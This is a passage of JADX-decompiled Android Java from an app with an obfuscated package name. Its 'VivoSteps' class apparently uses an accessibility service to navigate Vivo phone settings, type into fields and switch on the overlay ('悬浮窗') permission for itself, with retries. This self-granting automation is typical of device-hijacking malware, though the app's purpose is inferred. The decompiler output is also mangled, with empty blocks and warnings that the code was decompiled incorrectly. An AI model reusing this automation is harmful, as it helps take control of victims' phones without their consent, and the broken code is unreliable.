                str3 = vivoSteps$executeFlowD$1.f54881a1;
                c0371a8 = vivoSteps$executeFlowD$1.f54880a0;
                kg1.m213544f4(objM212393b02);
                zBooleanValue = ((Boolean) objM212393b02).booleanValue();
                if (zBooleanValue) {
                }
                return coroutineSingletons;
            case 9:
                str3 = vivoSteps$executeFlowD$1.f54881a1;
                c0371a8 = vivoSteps$executeFlowD$1.f54880a0;
                kg1.m213544f4(objM212393b02);
                zBooleanValue = ((Boolean) objM212393b02).booleanValue();
                if (zBooleanValue) {
                }
                break;
            case 10:
                str3 = vivoSteps$executeFlowD$1.f54881a1;
                c0371a82 = vivoSteps$executeFlowD$1.f54880a0;
                kg1.m213544f4(objM212393b02);
                zBooleanValue = ((Boolean) objM212393b02).booleanValue();
                if (!zBooleanValue) {
                }
                break;
            case oe0.DEFAULT_M /* 11 */:
                str3 = vivoSteps$executeFlowD$1.f54881a1;
                c0371a82 = vivoSteps$executeFlowD$1.f54880a0;
                kg1.m213544f4(objM212393b02);
                rootInActiveWindow = c0371a82.f55139a0.getRootInActiveWindow();
                if (rootInActiveWindow != null) {
                }
                break;
            case FileClientSessionCache.MAX_SIZE /* 12 */:
                accessibilityNodeInfo = vivoSteps$executeFlowD$1.f54884a4;
                list = vivoSteps$executeFlowD$1.f54883a3;
                AccessibilityNodeInfo accessibilityNodeInfo4 = vivoSteps$executeFlowD$1.f54882a2;
                String str8 = vivoSteps$executeFlowD$1.f54881a1;
                C0371a8 c0371a85 = vivoSteps$executeFlowD$1.f54880a0;
                kg1.m213544f4(objM212393b02);
                rootInActiveWindow = accessibilityNodeInfo4;
                c0371a83 = c0371a85;
                str4 = str8;
                Bundle bundle2 = new Bundle();
                bundle2.putCharSequence("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", str4);
                accessibilityNodeInfo.performAction(2097152, bundle2);
                accessibilityNodeInfo.recycle();
                vivoSteps$executeFlowD$1.f54880a0 = c0371a83;
                vivoSteps$executeFlowD$1.f54881a1 = str4;
                vivoSteps$executeFlowD$1.f54882a2 = rootInActiveWindow;
                vivoSteps$executeFlowD$1.f54883a3 = list;
                vivoSteps$executeFlowD$1.f54884a4 = null;
                vivoSteps$executeFlowD$1.f54887a7 = 13;
                if (b81.m210571b1(100L, vivoSteps$executeFlowD$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 13:
                list2 = vivoSteps$executeFlowD$1.f54883a3;
                accessibilityNodeInfo2 = vivoSteps$executeFlowD$1.f54882a2;
                str4 = vivoSteps$executeFlowD$1.f54881a1;
                c0371a83 = vivoSteps$executeFlowD$1.f54880a0;
                kg1.m213544f4(objM212393b02);
                String str52 = str4;
                listFindAccessibilityNodeInfosByViewId = list2;
                str3 = str52;
                rootInActiveWindow = accessibilityNodeInfo2;
                c0371a82 = c0371a83;
                t60.m214694b5(listFindAccessibilityNodeInfosByViewId, "searchNodes");
                it = listFindAccessibilityNodeInfosByViewId.iterator();
                while (it.hasNext()) {
                }
                rootInActiveWindow.recycle();
                vivoSteps$executeFlowD$1.f54880a0 = c0371a82;
                vivoSteps$executeFlowD$1.f54881a1 = str3;
                vivoSteps$executeFlowD$1.f54882a2 = null;
                vivoSteps$executeFlowD$1.f54883a3 = null;
                vivoSteps$executeFlowD$1.f54887a7 = 14;
                objM212393b0 = c0371a82.m212393b0(str3, 1, 30, vivoSteps$executeFlowD$1);
                if (objM212393b0 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 14:
                str3 = vivoSteps$executeFlowD$1.f54881a1;
                c0371a82 = vivoSteps$executeFlowD$1.f54880a0;
                kg1.m213544f4(objM212393b02);
                if (!((Boolean) objM212393b02).booleanValue()) {
                }
                break;
            case WebSocketProtocol.B0_MASK_OPCODE /* 15 */:
                str3 = vivoSteps$executeFlowD$1.f54881a1;
                c0371a82 = vivoSteps$executeFlowD$1.f54880a0;
                kg1.m213544f4(objM212393b02);
                String str62 = str3;
                c0371a84 = c0371a82;
                vivoSteps$executeFlowD$1.f54880a0 = c0371a84;
                vivoSteps$executeFlowD$1.f54881a1 = null;
                vivoSteps$executeFlowD$1.f54887a7 = 16;
                objM212393b02 = c0371a84.m212430f8(30, str62, vivoSteps$executeFlowD$1, true);
                if (objM212393b02 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 16:
                c0371a84 = vivoSteps$executeFlowD$1.f54880a0;
                kg1.m213544f4(objM212393b02);
                if (!((Boolean) objM212393b02).booleanValue()) {
                }
                break;
            case 17:
                kg1.m213544f4(objM212393b02);
                return Boolean.TRUE;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:30:0x007b, code lost:
    
        if (r8 != r1) goto L32;
     */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: c3 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212405c3(String str, ContinuationImpl continuationImpl) throws Throwable {
        VivoSteps$executeFlowV1955A$1 vivoSteps$executeFlowV1955A$1;
        C0371a8 c0371a8;
        if (continuationImpl instanceof VivoSteps$executeFlowV1955A$1) {
            vivoSteps$executeFlowV1955A$1 = (VivoSteps$executeFlowV1955A$1) continuationImpl;
            int i = vivoSteps$executeFlowV1955A$1.f54892a4;
            if ((i & Integer.MIN_VALUE) != 0) {
                vivoSteps$executeFlowV1955A$1.f54892a4 = i - Integer.MIN_VALUE;
            } else {
                vivoSteps$executeFlowV1955A$1 = new VivoSteps$executeFlowV1955A$1(this, continuationImpl);
            }
        }
        Object objM212408c6 = vivoSteps$executeFlowV1955A$1.f54890a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = vivoSteps$executeFlowV1955A$1.f54892a4;
        if (i2 == 0) {
            kg1.m213544f4(objM212408c6);
            vivoSteps$executeFlowV1955A$1.f54888a0 = this;
            vivoSteps$executeFlowV1955A$1.f54889a1 = str;
            vivoSteps$executeFlowV1955A$1.f54892a4 = 1;
            objM212408c6 = m212408c6(vivoSteps$executeFlowV1955A$1);
            if (objM212408c6 != coroutineSingletons) {
                c0371a8 = this;
            }
            return coroutineSingletons;
        }
        if (i2 == 1) {
            str = vivoSteps$executeFlowV1955A$1.f54889a1;
            c0371a8 = vivoSteps$executeFlowV1955A$1.f54888a0;
            kg1.m213544f4(objM212408c6);
        } else {
            if (i2 != 2) {
                if (i2 != 3) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                kg1.m213544f4(objM212408c6);
                return !((Boolean) objM212408c6).booleanValue() ? Boolean.FALSE : Boolean.TRUE;
            }
            str = vivoSteps$executeFlowV1955A$1.f54889a1;
            c0371a8 = vivoSteps$executeFlowV1955A$1.f54888a0;
            kg1.m213544f4(objM212408c6);
            vivoSteps$executeFlowV1955A$1.f54888a0 = null;
            vivoSteps$executeFlowV1955A$1.f54889a1 = null;
            vivoSteps$executeFlowV1955A$1.f54892a4 = 3;
            objM212408c6 = c0371a8.m212407c5(str, vivoSteps$executeFlowV1955A$1);
        }
        if (!((Boolean) objM212408c6).booleanValue()) {
            return Boolean.FALSE;
        }
        vivoSteps$executeFlowV1955A$1.f54888a0 = c0371a8;
        vivoSteps$executeFlowV1955A$1.f54889a1 = str;
        vivoSteps$executeFlowV1955A$1.f54892a4 = 2;
        if (b81.m210571b1(200L, vivoSteps$executeFlowV1955A$1) != coroutineSingletons) {
            vivoSteps$executeFlowV1955A$1.f54888a0 = null;
            vivoSteps$executeFlowV1955A$1.f54889a1 = null;
            vivoSteps$executeFlowV1955A$1.f54892a4 = 3;
            objM212408c6 = c0371a8.m212407c5(str, vivoSteps$executeFlowV1955A$1);
        }
        return coroutineSingletons;
    }

    /* JADX WARN: Removed duplicated region for block: B:50:0x0155 A[PHI: r1 r2 r4 r7
      0x0155: PHI (r1v12 h10) = (r1v11 h10), (r1v16 h10) binds: [B:48:0x0152, B:18:0x0047] A[DONT_GENERATE, DONT_INLINE]
      0x0155: PHI (r2v7 java.lang.String) = (r2v6 java.lang.String), (r2v10 java.lang.String) binds: [B:48:0x0152, B:18:0x0047] A[DONT_GENERATE, DONT_INLINE]
      0x0155: PHI (r4v11 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$FlowType) = 
      (r4v10 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$FlowType)
      (r4v13 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$FlowType)
     binds: [B:48:0x0152, B:18:0x0047] A[DONT_GENERATE, DONT_INLINE]
      0x0155: PHI (r7v10 com.storm.safe.rock.service.modules.yw5xud.a8) = (r7v9 com.storm.safe.rock.service.modules.yw5xud.a8), (r7v13 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:48:0x0152, B:18:0x0047] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:53:0x0167 A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0020  */
    /* renamed from: c4 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212406c4(VivoSteps$FlowType vivoSteps$FlowType, String str, h10 h10Var, ContinuationImpl continuationImpl) throws Throwable {
        VivoSteps$executeFlowWithVerification$1 vivoSteps$executeFlowWithVerification$1;
        String str2;
        VivoSteps$FlowType vivoSteps$FlowType2;
        int i;
        C0371a8 c0371a8;
        h10 h10Var2;
        String str3;
        VivoSteps$FlowType vivoSteps$FlowType3;
        C0371a8 c0371a82;
        h10 h10Var3 = h10Var;
        if (continuationImpl instanceof VivoSteps$executeFlowWithVerification$1) {
            vivoSteps$executeFlowWithVerification$1 = (VivoSteps$executeFlowWithVerification$1) continuationImpl;
            int i2 = vivoSteps$executeFlowWithVerification$1.f54900a7;
            if ((i2 & Integer.MIN_VALUE) != 0) {
                vivoSteps$executeFlowWithVerification$1.f54900a7 = i2 - Integer.MIN_VALUE;
            } else {
                vivoSteps$executeFlowWithVerification$1 = new VivoSteps$executeFlowWithVerification$1(this, continuationImpl);
            }
        }
        Object obj = vivoSteps$executeFlowWithVerification$1.f54898a5;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i3 = vivoSteps$executeFlowWithVerification$1.f54900a7;
        if (i3 == 0) {
            kg1.m213544f4(obj);
            w20 w20Var = this.f55142a3;
            boolean zM214991a6 = w20Var.m214991a6(vivoSteps$FlowType);
            LinkedHashMap linkedHashMap = w20Var.f60756a1;
            if (zM214991a6) {
                return Boolean.TRUE;
            }
            if (((Number) linkedHashMap.getOrDefault(vivoSteps$FlowType, 0)).intValue() >= w20Var.f60757a2) {
                t60.m214726f4(this.f55141a2, "[" + vivoSteps$FlowType.f54737a0 + "] ⚠️ 已达到最大尝试次数，标记为完成");
                w20Var.m214997b2(vivoSteps$FlowType);
                return Boolean.FALSE;
            }
            int iIntValue = ((Number) linkedHashMap.getOrDefault(vivoSteps$FlowType, 0)).intValue() + 1;
            linkedHashMap.put(vivoSteps$FlowType, Integer.valueOf(iIntValue));
            vivoSteps$executeFlowWithVerification$1.f54893a0 = this;
            vivoSteps$executeFlowWithVerification$1.f54894a1 = vivoSteps$FlowType;
            str2 = str;
            vivoSteps$executeFlowWithVerification$1.f54895a2 = str2;
            vivoSteps$executeFlowWithVerification$1.f54896a3 = h10Var3;
            vivoSteps$executeFlowWithVerification$1.f54897a4 = iIntValue;
            vivoSteps$executeFlowWithVerification$1.f54900a7 = 1;
            Object objInvoke = h10Var3.invoke(vivoSteps$executeFlowWithVerification$1);
            if (objInvoke != coroutineSingletons) {
                vivoSteps$FlowType2 = vivoSteps$FlowType;
                i = iIntValue;
                obj = objInvoke;
                c0371a8 = this;
            }
        }
        if (i3 != 1) {
            if (i3 != 2) {
                if (i3 != 3) {
                    if (i3 != 4) {
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                    }
                    kg1.m213544f4(obj);
                    return obj;
                }
                h10Var2 = vivoSteps$executeFlowWithVerification$1.f54896a3;
                str3 = vivoSteps$executeFlowWithVerification$1.f54895a2;
                vivoSteps$FlowType3 = vivoSteps$executeFlowWithVerification$1.f54894a1;
                c0371a82 = vivoSteps$executeFlowWithVerification$1.f54893a0;
                kg1.m213544f4(obj);
                vivoSteps$executeFlowWithVerification$1.f54893a0 = null;
                vivoSteps$executeFlowWithVerification$1.f54894a1 = null;
                vivoSteps$executeFlowWithVerification$1.f54895a2 = null;
                vivoSteps$executeFlowWithVerification$1.f54896a3 = null;
                vivoSteps$executeFlowWithVerification$1.f54900a7 = 4;
                Object objM212406c4 = c0371a82.m212406c4(vivoSteps$FlowType3, str3, h10Var2, vivoSteps$executeFlowWithVerification$1);
                return objM212406c4 != coroutineSingletons ? coroutineSingletons : objM212406c4;
            }
            h10Var2 = vivoSteps$executeFlowWithVerification$1.f54896a3;
            str3 = vivoSteps$executeFlowWithVerification$1.f54895a2;
            vivoSteps$FlowType3 = vivoSteps$executeFlowWithVerification$1.f54894a1;
            c0371a82 = vivoSteps$executeFlowWithVerification$1.f54893a0;
            kg1.m213544f4(obj);
            vivoSteps$executeFlowWithVerification$1.f54893a0 = c0371a82;
            vivoSteps$executeFlowWithVerification$1.f54894a1 = vivoSteps$FlowType3;
            vivoSteps$executeFlowWithVerification$1.f54895a2 = str3;
            vivoSteps$executeFlowWithVerification$1.f54896a3 = h10Var2;
            vivoSteps$executeFlowWithVerification$1.f54900a7 = 3;
            if (b81.m210571b1(300L, vivoSteps$executeFlowWithVerification$1) != coroutineSingletons) {
                vivoSteps$executeFlowWithVerification$1.f54893a0 = null;
                vivoSteps$executeFlowWithVerification$1.f54894a1 = null;
                vivoSteps$executeFlowWithVerification$1.f54895a2 = null;
                vivoSteps$executeFlowWithVerification$1.f54896a3 = null;
                vivoSteps$executeFlowWithVerification$1.f54900a7 = 4;
                Object objM212406c42 = c0371a82.m212406c4(vivoSteps$FlowType3, str3, h10Var2, vivoSteps$executeFlowWithVerification$1);
                if (objM212406c42 != coroutineSingletons) {
                }
            }
        }
        i = vivoSteps$executeFlowWithVerification$1.f54897a4;
        h10Var3 = vivoSteps$executeFlowWithVerification$1.f54896a3;
        str2 = vivoSteps$executeFlowWithVerification$1.f54895a2;
        vivoSteps$FlowType2 = vivoSteps$executeFlowWithVerification$1.f54894a1;
        c0371a8 = vivoSteps$executeFlowWithVerification$1.f54893a0;
        kg1.m213544f4(obj);
        Boolean bool = (Boolean) obj;
        boolean zBooleanValue = bool.booleanValue();
        if (zBooleanValue && c0371a8.f55142a3.m214991a6(vivoSteps$FlowType2)) {
            c0371a8.f55142a3.m214997b2(vivoSteps$FlowType2);
            return Boolean.TRUE;
        }
        if (!zBooleanValue) {
            w20 w20Var2 = c0371a8.f55142a3;
            w20Var2.getClass();
            t60.m214695b6(vivoSteps$FlowType2, "flowType");
            if (((Number) w20Var2.f60756a1.getOrDefault(vivoSteps$FlowType2, 0)).intValue() < w20Var2.f60757a2) {
                t60.m214726f4(c0371a8.f55141a2, "[" + vivoSteps$FlowType2.f54737a0 + "] ⚠️ 第" + i + "次失败，返回首页并重试");
                vivoSteps$executeFlowWithVerification$1.f54893a0 = c0371a8;
                vivoSteps$executeFlowWithVerification$1.f54894a1 = vivoSteps$FlowType2;
                vivoSteps$executeFlowWithVerification$1.f54895a2 = str2;
                vivoSteps$executeFlowWithVerification$1.f54896a3 = h10Var3;
                vivoSteps$executeFlowWithVerification$1.f54900a7 = 2;
                if (c0371a8.m212428f6(vivoSteps$executeFlowWithVerification$1) != coroutineSingletons) {
                    h10Var2 = h10Var3;
                    str3 = str2;
                    vivoSteps$FlowType3 = vivoSteps$FlowType2;
                    c0371a82 = c0371a8;
                    vivoSteps$executeFlowWithVerification$1.f54893a0 = c0371a82;
                    vivoSteps$executeFlowWithVerification$1.f54894a1 = vivoSteps$FlowType3;
                    vivoSteps$executeFlowWithVerification$1.f54895a2 = str3;
                    vivoSteps$executeFlowWithVerification$1.f54896a3 = h10Var2;
                    vivoSteps$executeFlowWithVerification$1.f54900a7 = 3;
                    if (b81.m210571b1(300L, vivoSteps$executeFlowWithVerification$1) != coroutineSingletons) {
                    }
                }
            }
        }
        return bool;
    }

    /* JADX WARN: Code restructure failed: missing block: B:124:0x02d7, code lost:
    
        if (p000.b81.m210571b1(100, r2) == r3) goto L129;
     */
    /* JADX WARN: Code restructure failed: missing block: B:128:0x02f8, code lost:
    
        if (p000.b81.m210571b1(100, r2) == r3) goto L129;
     */
    /* JADX WARN: Code restructure failed: missing block: B:65:0x017c, code lost:
    
        if (p000.b81.m210571b1(100, r2) == r3) goto L129;
     */
    /* JADX WARN: Code restructure failed: missing block: B:86:0x01f4, code lost:
    
        if (p000.b81.m210571b1(100, r2) == r3) goto L129;
     */
    /* JADX WARN: Code restructure failed: missing block: B:92:0x0221, code lost:
    
        if (p000.b81.m210571b1(100, r2) != r3) goto L24;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:105:0x0260  */
    /* JADX WARN: Removed duplicated region for block: B:107:0x026a  */
    /* JADX WARN: Removed duplicated region for block: B:113:0x028a A[PHI: r0 r2 r4 r16
      0x028a: PHI (r0v63 java.lang.Object) = (r0v62 java.lang.Object), (r0v1 java.lang.Object) binds: [B:111:0x0287, B:19:0x0053] A[DONT_GENERATE, DONT_INLINE]
      0x028a: PHI (r2v19 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$executeOverlayPermissionInternal$1) = 
      (r2v18 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$executeOverlayPermissionInternal$1)
      (r2v2 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$executeOverlayPermissionInternal$1)
     binds: [B:111:0x0287, B:19:0x0053] A[DONT_GENERATE, DONT_INLINE]
      0x028a: PHI (r4v52 com.storm.safe.rock.service.modules.yw5xud.a8) = (r4v50 com.storm.safe.rock.service.modules.yw5xud.a8), (r4v53 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:111:0x0287, B:19:0x0053] A[DONT_GENERATE, DONT_INLINE]
      0x028a: PHI (r16v16 int) = (r16v14 int), (r16v17 int) binds: [B:111:0x0287, B:19:0x0053] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:115:0x0292  */
    /* JADX WARN: Removed duplicated region for block: B:117:0x029c  */
    /* JADX WARN: Removed duplicated region for block: B:122:0x02b8  */
    /* JADX WARN: Removed duplicated region for block: B:132:0x02fe  */
    /* JADX WARN: Removed duplicated region for block: B:52:0x0127  */
    /* JADX WARN: Removed duplicated region for block: B:57:0x0148 A[PHI: r0 r4 r5
      0x0148: PHI (r0v15 java.lang.String) = (r0v12 java.lang.String), (r0v20 java.lang.String) binds: [B:51:0x0125, B:56:0x013d] A[DONT_GENERATE, DONT_INLINE]
      0x0148: PHI (r4v16 boolean) = (r4v9 boolean), (r4v21 boolean) binds: [B:51:0x0125, B:56:0x013d] A[DONT_GENERATE, DONT_INLINE]
      0x0148: PHI (r5v5 com.storm.safe.rock.service.modules.yw5xud.a8) = (r5v3 com.storm.safe.rock.service.modules.yw5xud.a8), (r5v6 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:51:0x0125, B:56:0x013d] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:58:0x014a  */
    /* JADX WARN: Removed duplicated region for block: B:63:0x016a A[PHI: r0 r4 r5
      0x016a: PHI (r0v21 java.lang.String) = (r0v15 java.lang.String), (r0v25 java.lang.String) binds: [B:57:0x0148, B:62:0x015f] A[DONT_GENERATE, DONT_INLINE]
      0x016a: PHI (r4v23 boolean) = (r4v16 boolean), (r4v28 boolean) binds: [B:57:0x0148, B:62:0x015f] A[DONT_GENERATE, DONT_INLINE]
      0x016a: PHI (r5v8 com.storm.safe.rock.service.modules.yw5xud.a8) = (r5v5 com.storm.safe.rock.service.modules.yw5xud.a8), (r5v9 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:57:0x0148, B:62:0x015f] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:64:0x016c  */
    /* JADX WARN: Removed duplicated region for block: B:74:0x0199  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Removed duplicated region for block: B:85:0x01e5  */
    /* JADX WARN: Removed duplicated region for block: B:91:0x0212 A[PHI: r2 r4 r5 r6 r7 r16
      0x0212: PHI (r2v5 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$executeOverlayPermissionInternal$1) = 
      (r2v9 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$executeOverlayPermissionInternal$1)
      (r2v11 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$executeOverlayPermissionInternal$1)
     binds: [B:89:0x020a, B:84:0x01e3] A[DONT_GENERATE, DONT_INLINE]
      0x0212: PHI (r4v36 int) = (r4v39 int), (r4v41 int) binds: [B:89:0x020a, B:84:0x01e3] A[DONT_GENERATE, DONT_INLINE]
      0x0212: PHI (r5v16 int) = (r5v18 int), (r5v19 int) binds: [B:89:0x020a, B:84:0x01e3] A[DONT_GENERATE, DONT_INLINE]
      0x0212: PHI (r6v3 java.lang.String) = (r6v4 java.lang.String), (r6v5 java.lang.String) binds: [B:89:0x020a, B:84:0x01e3] A[DONT_GENERATE, DONT_INLINE]
      0x0212: PHI (r7v3 com.storm.safe.rock.service.modules.yw5xud.a8) = (r7v5 com.storm.safe.rock.service.modules.yw5xud.a8), (r7v7 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:89:0x020a, B:84:0x01e3] A[DONT_GENERATE, DONT_INLINE]
      0x0212: PHI (r16v2 int) = (r16v4 int), (r16v5 int) binds: [B:89:0x020a, B:84:0x01e3] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:95:0x022d  */
    /* JADX WARN: Removed duplicated region for block: B:97:0x0232  */
    /* JADX WARN: Removed duplicated region for block: B:99:0x023c  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:92:0x0221 -> B:24:0x0081). Please report as a decompilation issue!!! */
    /* renamed from: c5 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212407c5(String str, ContinuationImpl continuationImpl) throws Throwable {
        VivoSteps$executeOverlayPermissionInternal$1 vivoSteps$executeOverlayPermissionInternal$1;
        String string;
        String str2;
        C0371a8 c0371a8;
        Object objM212430f8;
        CharSequence packageName;
        boolean zBooleanValue;
        String str3;
        String str4;
        VivoSteps$executeOverlayPermissionInternal$1 vivoSteps$executeOverlayPermissionInternal$12;
        int i;
        int i2;
        String str5;
        int i3;
        int i4;
        String str6;
        C0371a8 c0371a82;
        int i5;
        C0371a8 c0371a83;
        String str7;
        boolean z;
        C0371a8 c0371a84;
        Context context;
        if (continuationImpl instanceof VivoSteps$executeOverlayPermissionInternal$1) {
            vivoSteps$executeOverlayPermissionInternal$1 = (VivoSteps$executeOverlayPermissionInternal$1) continuationImpl;
            int i6 = vivoSteps$executeOverlayPermissionInternal$1.f54914a6;
            if ((i6 & Integer.MIN_VALUE) != 0) {
                vivoSteps$executeOverlayPermissionInternal$1.f54914a6 = i6 - Integer.MIN_VALUE;
            } else {
                vivoSteps$executeOverlayPermissionInternal$1 = new VivoSteps$executeOverlayPermissionInternal$1(this, continuationImpl);
            }
        }
        Object objM212431f9 = vivoSteps$executeOverlayPermissionInternal$1.f54912a4;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i7 = vivoSteps$executeOverlayPermissionInternal$1.f54914a6;
        int i8 = 3;
        VivoSteps$FlowType vivoSteps$FlowType = VivoSteps$FlowType.OVERLAY_PERMISSION;
        int i9 = 1;
        switch (i7) {
            case 0:
                kg1.m213544f4(objM212431f9);
                if (Settings.canDrawOverlays(this.f55140a1)) {
                    t60.m214714d6(this.f55141a2, "[悬浮窗] 已有悬浮窗权限");
                    this.f55142a3.m214997b2(vivoSteps$FlowType);
                    return Boolean.TRUE;
                }
                AccessibilityNodeInfo rootInActiveWindow = this.f55139a0.getRootInActiveWindow();
                if (rootInActiveWindow == null || (packageName = rootInActiveWindow.getPackageName()) == null || (string = packageName.toString()) == null) {
                    string = "";
                }
                if (rootInActiveWindow != null) {
                    rootInActiveWindow.recycle();
                }
                if (AbstractC0779a1.m213652a5(string, "permissionmanager", true)) {
                    vivoSteps$executeOverlayPermissionInternal$1.f54908a0 = this;
                    str2 = str;
                    vivoSteps$executeOverlayPermissionInternal$1.f54909a1 = str2;
                    vivoSteps$executeOverlayPermissionInternal$1.f54914a6 = 1;
                    objM212430f8 = m212430f8(30, "悬浮窗", vivoSteps$executeOverlayPermissionInternal$1, true);
                    if (objM212430f8 != coroutineSingletons) {
                        c0371a8 = this;
                        zBooleanValue = ((Boolean) objM212430f8).booleanValue();
                        if (zBooleanValue) {
                            vivoSteps$executeOverlayPermissionInternal$1.f54908a0 = c0371a8;
                            vivoSteps$executeOverlayPermissionInternal$1.f54909a1 = str2;
                            vivoSteps$executeOverlayPermissionInternal$1.f54914a6 = 2;
                            Object objM212430f82 = c0371a8.m212430f8(10, "Display over", vivoSteps$executeOverlayPermissionInternal$1, true);
                            if (objM212430f82 != coroutineSingletons) {
                                str3 = str2;
                                objM212431f9 = objM212430f82;
                                String str8 = str3;
                                zBooleanValue = ((Boolean) objM212431f9).booleanValue();
                                str2 = str8;
                                if (zBooleanValue) {
                                    if (zBooleanValue) {
                                    }
                                    vivoSteps$executeOverlayPermissionInternal$12 = vivoSteps$executeOverlayPermissionInternal$1;
                                    i = 0;
                                    i2 = 0;
                                    str5 = str2;
                                    if (i >= i8) {
                                    }
                                } else {
                                    vivoSteps$executeOverlayPermissionInternal$1.f54908a0 = c0371a8;
                                    vivoSteps$executeOverlayPermissionInternal$1.f54909a1 = str2;
                                    vivoSteps$executeOverlayPermissionInternal$1.f54914a6 = 3;
                                    Object objM212430f83 = c0371a8.m212430f8(10, "Overlay", vivoSteps$executeOverlayPermissionInternal$1, true);
                                    if (objM212430f83 != coroutineSingletons) {
                                        str4 = str2;
                                        objM212431f9 = objM212430f83;
                                        String str9 = str4;
                                        zBooleanValue = ((Boolean) objM212431f9).booleanValue();
                                        str2 = str9;
                                        if (zBooleanValue) {
                                            c0371a8.f55142a3.m214998b3("vivo_overlay_switch_done");
                                            vivoSteps$executeOverlayPermissionInternal$1.f54908a0 = c0371a8;
                                            vivoSteps$executeOverlayPermissionInternal$1.f54909a1 = str2;
                                            vivoSteps$executeOverlayPermissionInternal$1.f54914a6 = 4;
                                            break;
                                        }
                                        vivoSteps$executeOverlayPermissionInternal$12 = vivoSteps$executeOverlayPermissionInternal$1;
                                        i = 0;
                                        i2 = 0;
                                        str5 = str2;
                                        if (i >= i8) {
                                            vivoSteps$executeOverlayPermissionInternal$12.f54908a0 = c0371a8;
                                            vivoSteps$executeOverlayPermissionInternal$12.f54909a1 = str5;
                                            vivoSteps$executeOverlayPermissionInternal$12.f54910a2 = i2;
                                            vivoSteps$executeOverlayPermissionInternal$12.f54911a3 = i;
                                            vivoSteps$executeOverlayPermissionInternal$12.f54914a6 = 5;
                                            c0371a8.getClass();
                                            try {
                                            } catch (Exception e) {
                                                String str10 = c0371a8.f55141a2;
                                                String message = e.getMessage();
                                                i5 = i9 == true ? 1 : 0;
                                                tz0.m214807a7("[悬浮窗权限] ❌ 打开失败: ", message, str10);
                                                z = 0;
                                            }
                                            Intent intent = new Intent("android.settings.action.MANAGE_OVERLAY_PERMISSION");
                                            intent.setFlags(276824064);
                                            c0371a8.f55140a1.startActivity(intent);
                                            i5 = i9 == true ? 1 : 0;
                                            z = i9;
                                            objM212431f9 = Boolean.valueOf(z);
                                            if (objM212431f9 != coroutineSingletons) {
                                                int i10 = i;
                                                str6 = str5;
                                                vivoSteps$executeOverlayPermissionInternal$1 = vivoSteps$executeOverlayPermissionInternal$12;
                                                i3 = i10;
                                                int i11 = i2;
                                                c0371a82 = c0371a8;
                                                i4 = i11;
                                                if (!((Boolean) objM212431f9).booleanValue()) {
                                                    vivoSteps$executeOverlayPermissionInternal$1.f54908a0 = c0371a82;
                                                    vivoSteps$executeOverlayPermissionInternal$1.f54909a1 = str6;
                                                    vivoSteps$executeOverlayPermissionInternal$1.f54910a2 = i4;
                                                    vivoSteps$executeOverlayPermissionInternal$1.f54911a3 = i3;
                                                    vivoSteps$executeOverlayPermissionInternal$1.f54914a6 = 6;
                                                    break;
                                                } else {
                                                    vivoSteps$executeOverlayPermissionInternal$1.f54908a0 = c0371a82;
                                                    vivoSteps$executeOverlayPermissionInternal$1.f54909a1 = str6;
                                                    vivoSteps$executeOverlayPermissionInternal$1.f54910a2 = i4;
                                                    vivoSteps$executeOverlayPermissionInternal$1.f54911a3 = i3;
                                                    vivoSteps$executeOverlayPermissionInternal$1.f54914a6 = 7;
                                                    break;
                                                }
                                            }
                                        } else {
                                            i5 = i9 == true ? 1 : 0;
                                            c0371a83 = c0371a8;
                                            if (i2 != 0) {
                                                t60.m214704c5(c0371a83.f55141a2, "[悬浮窗权限] ❌ 无法打开悬浮窗权限页面");
                                                return Boolean.FALSE;
                                            }
                                            c0371a83.f55142a3.m214998b3("vivo_overlay_page_opened");
                                            vivoSteps$executeOverlayPermissionInternal$12.f54908a0 = c0371a83;
                                            vivoSteps$executeOverlayPermissionInternal$12.f54909a1 = str5;
                                            vivoSteps$executeOverlayPermissionInternal$12.f54914a6 = 8;
                                            objM212431f9 = c0371a83.m212431f9(str5, vivoSteps$executeOverlayPermissionInternal$12);
                                            if (objM212431f9 != coroutineSingletons) {
                                                VivoSteps$executeOverlayPermissionInternal$1 vivoSteps$executeOverlayPermissionInternal$13 = vivoSteps$executeOverlayPermissionInternal$12;
